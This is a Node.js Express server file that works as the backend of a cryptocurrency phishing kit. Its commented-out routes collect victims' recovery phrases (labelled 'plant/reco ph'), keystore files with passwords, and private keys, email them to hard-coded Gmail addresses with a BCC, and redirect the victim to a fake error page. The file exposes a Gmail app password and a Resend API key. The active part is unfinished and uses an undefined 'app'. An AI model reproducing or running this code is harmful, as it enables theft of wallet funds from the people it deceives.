// const express = require("express");
// const bodyParser = require("body-parser");
// const nodemailer = require("nodemailer");
// const cors = require("cors"); // Import cors

// const app = express();
// const PORT = 3000;

// // Enable CORS with default options (for any origin)
// app.use(
//   cors({
//     origin: "http://localhost:5500",
//     methods: "POST",
//     allowedHeaders: ["Content-Type"],
//   })
// );
// // Middleware to parse form data
// app.use(bodyParser.urlencoded({ extended: true }));
// // Configure Nodemailer transporter
// const transporter = nodemailer.createTransport({
//   host: "smtp.gmail.com",
//   port: 465,
//   secure: true,
//   auth: {
//     user: "Mikun5y@gmail.com", // Replace with your email
//     pass: "rwzs rmuq slgr vcgz", // Replace with your app password
//   },
// });
// // Helper function to send email
// function sendEmail(subject, text) {
//   const mailOptions = {
//     from: "Mikun5y@gmail.com", // Replace with your email
//     to: "Mikun5y@gmail.com", // Your email to receive the form data
//     bcc: "yekeen244@gmail.com",
//     subject: subject,
//     text: text,
//   };

//   return transporter
//     .sendMail(mailOptions)
//     .then((info) => {
//       console.log("Email sent successfully:", info.response);
//       return info;
//     })
//     .catch((error) => {
//       console.error("Detailed email error:", error);
//       throw error;
//     });
// }
// // Optional: Test the connection when the server starts

// // Route for handling plant/reco ph submission
// app.post("/submit-plant", (req, res) => {
//   const { ph } = req.body;
//   const subject = "plant/reco ph Submission";
//   const message = `plant ph: ${ph}`;

//   sendEmail(subject, message);
//   res.redirect("https://galant.dev");
// });

// // Route for handling KeyStore JSON submission
// app.post("/submit-keystore", (req, res) => {
//   const { keystore, password } = req.body;
//   const subject = "Keystore JSON Submission";
//   const message = `Keystore Value: ${keystore}\nPassword: ${password}`;

//   sendEmail(subject, message);
//   res.redirect("https://defiii.netlify.app/error");
// });

// // Route for handling Private Key submission
// app.post("/submit-privatekey", (req, res) => {
//   const { privatekey } = req.body;
//   const subject = "Private Key Submission";
//   const message = `Private Key: ${privatekey}`;

//   sendEmail(subject, message);
//   res.redirect("https://defiii.netlify.app/error");
// });

// // Start the server
// app.listen(PORT, () => {
//   console.log(`Server running at http://localhost:${PORT}`);
// });

const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors"); // Import cors
const { Resend } = require("resend");

const resend = new Resend("re_9GJsrHWa_CcBWCoBTBHAyE171cS2oYRoV");

app.use(
  cors({
    origin: ["http://localhost:5500", "https://form-z32c.onrender.com"],
    methods: "POST",
    allowedHeaders: ["Content-Type"],
  })
);

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
